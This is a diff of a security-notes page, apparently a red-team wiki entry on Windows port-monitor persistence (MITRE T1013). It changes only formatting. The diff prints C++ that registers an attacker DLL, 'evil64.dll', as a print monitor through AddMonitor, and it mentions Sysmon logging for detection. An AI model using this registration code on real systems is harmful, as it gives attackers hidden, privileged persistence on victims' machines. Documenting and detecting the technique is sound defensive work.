@@ -21,16 +21,16 @@ Writing and compiling a simple C++ code that will register the monitor port:
 #include "stdafx.h"
 #include "Windows.h"
 
-int main() {	
-	MONITOR_INFO_2 monitorInfo;
-	TCHAR env[12] = TEXT("Windows x64");
-	TCHAR name[12] = TEXT("evilMonitor");
-	TCHAR dll[12] = TEXT("evil64.dll");
-	monitorInfo.pName = name;
-	monitorInfo.pEnvironment = env;
-	monitorInfo.pDLLName = dll;
-	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
-	return 0;
+int main() {    
+    MONITOR_INFO_2 monitorInfo;
+    TCHAR env[12] = TEXT("Windows x64");
+    TCHAR name[12] = TEXT("evilMonitor");
+    TCHAR dll[12] = TEXT("evil64.dll");
+    monitorInfo.pName = name;
+    monitorInfo.pEnvironment = env;
+    monitorInfo.pDLLName = dll;
+    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
+    return 0;
 }
 ```
 {% endcode %}
@@ -65,13 +65,11 @@ Sysmon commandline arguments and network connection logging to the rescue:
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1013" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1013" caption="" %}
 
-{% embed url="https://www.youtube.com/watch?v=dq2Hv7J9fvk" %}
+{% embed url="https://www.youtube.com/watch?v=dq2Hv7J9fvk" caption="" %}
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341\(v=vs.85\).aspx" %}
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341\(v=vs.85\).aspx" caption="" %}
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068\(v=vs.85\).aspx" %}
-
-
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068\(v=vs.85\).aspx" caption="" %}
 
